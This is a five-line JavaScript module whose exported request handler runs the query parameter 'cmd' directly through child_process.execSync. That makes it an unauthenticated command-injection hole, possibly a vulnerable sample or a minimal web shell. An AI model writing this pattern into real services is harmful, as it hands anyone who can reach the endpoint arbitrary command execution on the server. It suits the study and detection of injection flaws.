import { execSync } from 'child_process';

export function handler(req) {
  execSync(req.query.cmd);
}
